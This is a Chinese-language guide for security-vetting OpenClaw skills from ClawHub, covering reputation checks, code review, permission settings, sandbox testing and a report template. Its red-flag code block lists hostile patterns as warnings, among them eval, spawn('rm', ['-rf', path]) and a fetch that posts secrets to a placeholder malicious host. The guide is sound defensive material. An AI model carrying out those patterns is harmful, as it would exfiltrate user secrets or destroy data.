# 🔍 Skill Vetting Guide - 技能审查指南

**版本**: 1.0  
**创建**: 2026-03-10  
**目的**: 在 ClawHub 上审查和验证技能的安全性

---

## 🎯 什么是 Skill Vetting?

Skill Vetting（技能审查）是在安装 OpenClaw 技能之前，对技能进行系统性安全评估的过程。

### 为什么需要审查？

- 🔐 防止恶意代码执行
- 🛡️ 保护敏感数据和 API Keys
- 📊 确保技能质量
- ⚠️ 避免权限滥用

---

## 📋 审查流程

### 阶段 1: 初步筛选 ⭐⭐⭐

**在 ClawHub 上查看技能页面**:

```
https://clawhub.ai/skills/<skill-name>
```

**检查项目**:

| 项目 | 标准 | 权重 |
|------|------|------|
| 作者信誉 | 有历史记录，其他技能评价良好 | ⭐⭐⭐ |
| 下载量 | 100+ 下载 | ⭐⭐ |
| 评分 | 4 星以上 | ⭐⭐⭐ |
| 更新时间 | 6 个月内有更新 | ⭐⭐ |
| 文档完整 | SKILL.md 清晰详细 | ⭐⭐⭐ |
| 问题反馈 | Issues 响应及时 | ⭐⭐ |

**快速决策**:
- ✅ 全部通过 → 进入下一阶段
- ⚠️ 1-2 项不达标 → 谨慎考虑
- ❌ 3 项以上不达标 → 拒绝

---

### 阶段 2: 代码审查 ⭐⭐⭐⭐⭐

**获取源码**:

```bash
# 方法 1: ClawHub CLI
clawhub skills download <skill-name> --output ./skill-review

# 方法 2: Git
git clone https://github.com/author/skill-name.git ./skill-review
```

**运行自动化检查**:

```bash
cd ./skill-review
./scripts/skill-security-check.sh
```

**手动审查要点**:

#### 1. package.json 检查

```bash
cat package.json
```

**关注**:
- 依赖数量（异常多 → 警惕）
- 可疑包（child_process, eval 相关）
- 版本锁定（有 lock 文件 → 好）

#### 2. 主入口文件审查

```bash
cat index.js
# 或
cat src/index.ts
```

**危险信号** 🚩:
```javascript
// ❌ 动态代码执行
eval(code)
new Function(code)
vm.runInThisContext(code)

// ❌ 无限制的系统命令
exec(userInput)
spawn('rm', ['-rf', path])

// ❌ 硬编码密钥
const API_KEY = "sk-xxxx"
const PRIVATE_KEY = "0x..."

// ❌ 隐藏的网络请求
fetch('http://malicious-site.com', {
  method: 'POST',
  body: JSON.stringify({ secrets })
})
```

**安全实践** ✅:
```javascript
// ✅ 使用环境变量
const API_KEY = process.env.API_KEY

// ✅ 权限检查
if (!allowedPaths.includes(path)) {
  throw new Error('Access denied')
}

// ✅ 输入验证
if (!isValidUrl(url)) {
  throw new Error('Invalid URL')
}
```

#### 3. 文件系统访问审查

```bash
grep -r "fs\." --include="*.js" .
```

**检查**:
- 是否限制访问路径？
- 是否允许写入敏感目录？
- 是否有路径遍历漏洞？

#### 4. 网络请求审查

```bash
grep -r "fetch\|axios\|http\." --include="*.js" .
```

**检查**:
- 请求目标是否明确？
- 是否使用 HTTPS？
- 是否发送敏感数据？

---

### 阶段 3: 权限审查 ⭐⭐⭐⭐

**查看 SKILL.md 中的权限声明**:

```bash
cat SKILL.md
```

**权限风险等级**:

| 权限 | 风险 | 审查要点 |
|------|------|----------|
| `exec` | 🔴 高 | 执行什么命令？用户输入是否过滤？ |
| `writeFile` | 🟡 中 | 写入哪些路径？是否限制？ |
| `readFile` | 🟡 中 | 读取哪些路径？是否越权？ |
| `fetch` | 🟡 中 | 访问哪些域名？是否 HTTPS？ |
| `browser` | 🟡 中 | 控制哪个浏览器？做什么操作？ |
| `message` | 🟢 低 | 发送消息到哪个渠道？ |
| `web_search` | 🟢 低 | 仅搜索 API |
| `tts` | 🟢 低 | 仅语音合成 |

**权限配置建议**:

```json
{
  "skills": {
    "skill-name": {
      "permissions": {
        "exec": false,
        "writeFile": ["./workspace/**/*"],
        "readFile": ["./workspace/**/*"],
        "fetch": ["api.trusted-domain.com"],
        "browser": {
          "allowedUrls": ["https://trusted-site.com"]
        }
      }
    }
  }
}
```

---

### 阶段 4: 沙箱测试 ⭐⭐⭐⭐

**创建测试会话**:

```bash
# 创建隔离会话
openclaw sessions spawn \
  --runtime=subagent \
  --mode=run \
  --task "test skill: <skill-name>" \
  --label "skill-vetting-test"
```

**测试用例**:

1. **功能测试**
   - 技能是否按描述工作？
   - 边界条件是否正常处理？

2. **异常测试**
   - 输入非法数据会怎样？
   - 网络断开会怎样？
   - 文件不存在会怎样？

3. **资源测试**
   - CPU/内存使用是否合理？
   - 是否有内存泄漏？
   - 是否有无限循环？

4. **安全测试**
   - 尝试注入恶意输入
   - 尝试访问未授权路径
   - 监控网络请求

**检查日志**:

```bash
openclaw sessions history --session "skill-vetting-test"
```

---

### 阶段 5: 最终决策 ⭐⭐⭐⭐⭐

**评分表**:

| 项目 | 得分 (1-5) | 备注 |
|------|-----------|------|
| 代码质量 | ___ | |
| 安全性 | ___ | |
| 文档完整 | ___ | |
| 权限合理 | ___ | |
| 测试覆盖 | ___ | |

**决策标准**:

- **总分 20-25**: ✅ 批准安装
- **总分 15-19**: ⚠️ 有条件批准（限制权限）
- **总分 <15**: ❌ 拒绝安装

---

## 🛠️ 自动化工具

### 1. 安全检查脚本

```bash
./scripts/skill-security-check.sh <skill-directory>
```

**输出**:
- ✅ 必需文件检查
- ⚠️ 危险操作扫描
- 🔑 敏感信息检测
- 🌐 网络请求审查
- 📂 文件系统访问

### 2. 依赖审计

```bash
cd <skill-directory>
npm audit
```

### 3. 静态分析

```bash
# 安装 eslint
npm install -g eslint

# 分析代码
eslint .
```

---

## 📝 审查报告模板

```markdown
# Skill Vetting Report: <skill-name>

**审查日期**: YYYY-MM-DD  
**审查人**: ___________  
**版本**: x.x.x

## 基本信息
- 作者：___________
- 来源：___________
- 下载量：___________
- 评分：___________

## 审查结果

### 代码审查
- [ ] 无硬编码密钥
- [ ] 无危险 eval/exec
- [ ] 文件系统访问安全
- [ ] 网络请求可信

### 权限审查
- 申请的权限：___________
- 建议的权限：___________
- 风险等级：高/中/低

### 测试结果
- 功能测试：通过/失败
- 异常测试：通过/失败
- 资源测试：通过/失败
- 安全测试：通过/失败

## 评分
- 代码质量：___/5
- 安全性：___/5
- 文档：___/5
- 权限：___/5
- 测试：___/5
- **总分**: ___/25

## 决策
- [ ] ✅ 批准安装
- [ ] ⚠️ 有条件批准
- [ ] ❌ 拒绝安装

## 备注
___________
```

---

## 🆘 常见问题

### Q: 发现硬编码的 API Key 怎么办？

**A**: 
1. 联系作者移除
2.  fork 后自己修复
3. 如果作者不响应 → 拒绝

### Q: 技能需要 exec 权限怎么办？

**A**:
1. 审查执行的命令是否必要
2. 确认输入是否严格过滤
3. 考虑替代方案（如专用 API）
4. 如非必要 → 要求移除

### Q: 如何测试技能的网络行为？

**A**:
```bash
# 监控网络请求
sudo tcpdump -i any -n port 80 or port 443

# 或使用 Wireshark 图形化分析
```

---

## 🔗 相关资源

- [OpenClaw 安全文档](https://docs.openclaw.ai/security)
- [ClawGuard 工具](https://docs.openclaw.ai/tools/clawguard)
- [技能开发指南](https://docs.openclaw.ai/skills)
- [本项目的安全检查脚本](./scripts/skill-security-check.sh)

---

**最后更新**: 2026-03-10  
**下次审查**: 发现新技能时
